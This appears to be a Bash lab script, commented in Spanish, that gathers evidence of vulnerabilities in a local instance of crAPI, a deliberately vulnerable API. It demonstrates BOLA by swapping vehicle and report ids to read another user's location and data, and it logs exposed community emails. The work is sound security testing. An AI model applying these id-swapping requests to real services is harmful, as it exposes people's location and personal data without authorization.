#!/usr/bin/env bash
# Reconocimiento y pruebas del Bloque A contra crAPI.
# Levanta crAPI aparte (C:\labs\crAPI) y corre:
#   bash scripts/evidencias_crapi.sh
# Deja los .txt en evidencias/crAPI/ con el token oculto.
set -euo pipefail
cd "$(dirname "$0")/.."

B=${CRAPI_URL:-http://localhost:8888}
MAIL=${MAILHOG_URL:-http://localhost:8025}
OUT=evidencias/crAPI
mkdir -p "$OUT"
PASS='LabCrapi-2026!'

login() {  # $1=usuario -> token
  curl -s -X POST "$B/identity/api/auth/login" -H 'Content-Type: application/json' \
    -d "{\"email\":\"usuario$1@lab.local\",\"password\":\"$PASS\"}" \
    | sed -E 's/.*"token":"([^"]+)".*/\1/'
}

signup() {  # $1=usuario (idempotente: si ya existe, crAPI responde 403 y seguimos)
  curl -s -o /dev/null -X POST "$B/identity/api/auth/signup" -H 'Content-Type: application/json' \
    -d "{\"name\":\"Usuario $1\",\"email\":\"usuario$1@lab.local\",\"number\":\"900000${1}11\",\"password\":\"$PASS\"}"
}

# crAPI manda VIN y pincode por correo; los saco de MailHog (quita los saltos de linea suaves =\r\n)
add_vehicle() {  # $1=usuario $2=token
  local tok=$2 raw vin pin
  # el correo viene en JSON con HTML: decodifico </>, quito saltos suaves \r\n,
  # decodifico =3D y por ultimo saco las etiquetas (color=#0000ff tiene digitos que estorban)
  raw=$(curl -s "$MAIL/api/v2/search?kind=to&query=usuario$1" \
        | sed -E 's/\\u003c/</g; s/\\u003e/>/g; s/\\r\\n//g; s/=3D/=/g' | sed 's/<[^>]*>//g')
  vin=$(echo "$raw" | grep -oE '[A-Z0-9]{17}' | head -1 || true)
  pin=$(echo "$raw" | grep -oiE 'pincode[^0-9]*[0-9]{4}' | grep -oE '[0-9]{4}' | head -1 || true)
  [ -n "$vin" ] && [ -n "$pin" ] || { echo "  (no se encontro VIN/pincode de $1 en MailHog)"; return; }
  curl -s -o /dev/null -X POST "$B/identity/api/v2/vehicle/add_vehicle" -H "Authorization: Bearer $tok" \
    -H 'Content-Type: application/json' -d "{\"vin\":\"$vin\",\"pincode\":\"$pin\"}"
}

# registra el par solicitud/respuesta en un archivo, con el token recortado
cap() {  # $1=archivo $2=titulo $3=metodo $4=ruta $5=token
  local file="$OUT/$1" titulo="$2" metodo="$3" ruta="$4" tok="${5:-}"
  local hdr=() shown="(sin token)"
  if [ -n "$tok" ]; then hdr=(-H "Authorization: Bearer $tok"); shown="Bearer ${tok:0:6}…[OCULTO]"; fi
  local body code
  body=$(curl -s -w $'\n%{http_code}' "${hdr[@]}" "$B$ruta")
  code=$(echo "$body" | tail -1)
  body=$(echo "$body" | sed '$d')
  {
    echo "# $titulo"
    echo "# $(date -u +%FT%TZ) · crAPI · token oculto"
    echo
    echo "> $metodo $ruta"
    [ -n "$tok" ] && echo "> Authorization: $shown"
    echo "< HTTP $code"
    echo "$body" | python -m json.tool 2>/dev/null || echo "$body"
  } > "$file"
  echo "  $1 -> HTTP $code"
}

echo "registro de los dos usuarios de laboratorio (idempotente)"
signup a; signup b

echo "login"
TA=$(login a); TB=$(login b)
[ -n "$TA" ] && [ -n "$TB" ] || { echo "no se pudo iniciar sesion; ¿crAPI arriba?" >&2; exit 1; }

echo "alta del vehiculo de cada usuario (VIN+pincode desde MailHog)"
add_vehicle a "$TA"; add_vehicle b "$TB"

echo "inventario / reconocimiento"
cap recon_dashboard_A.txt "Dashboard de A (datos del propio usuario)" GET /identity/api/v2/user/dashboard "$TA"
cap recon_shop_products.txt "Catalogo de la tienda" GET /workshop/api/shop/products "$TA"
cap recon_mechanics.txt "Lista de mecanicos" GET /workshop/api/mechanic/ "$TA"

echo "H2 - exposicion de datos (feed de la comunidad)"
cap H2_community_posts_recent.txt "Feed de la comunidad: expone correo y vehicleid de otros" \
    GET "/community/api/v2/community/posts/recent?limit=5&offset=0" "$TA"

echo "H1 - BOLA ubicacion de vehiculo"
# uuid del vehiculo propio de A y del de B (ambos registrados con el pincode del correo)
UUID_A=$(curl -s $B/identity/api/v2/vehicle/vehicles -H "Authorization: Bearer $TA" | sed -E 's/.*"uuid":"([^"]+)".*/\1/')
UUID_B=$(curl -s $B/identity/api/v2/vehicle/vehicles -H "Authorization: Bearer $TB" | sed -E 's/.*"uuid":"([^"]+)".*/\1/')
echo "  vehiculo de A = $UUID_A"
echo "  vehiculo de B = $UUID_B"
# 1) solicitud original: A consulta SU propio vehiculo
cap H1_location_propio_A.txt "Baseline: A consulta la ubicacion de SU vehiculo" \
    GET "/identity/api/v2/vehicle/$UUID_A/location" "$TA"
# 2) solicitud modificada: A cambia el id por el de B
cap H1_location_vehiculo_B.txt "BOLA: A cambia el id y consulta la ubicacion del vehiculo de B" \
    GET "/identity/api/v2/vehicle/$UUID_B/location" "$TA"

echo "H1b - BOLA mechanic_report (id secuencial)"
cap H1b_mechanic_report_1.txt "BOLA: A lee el reporte 1 (de otro usuario) cambiando el id" \
    GET "/workshop/api/mechanic/mechanic_report?report_id=1" "$TA"

echo "control negativo: mismo endpoint sin token"
cap neg_location_sin_token.txt "La misma ruta de ubicacion sin token" \
    GET "/identity/api/v2/vehicle/$UUID_B/location"

echo "listo, evidencias en $OUT/"
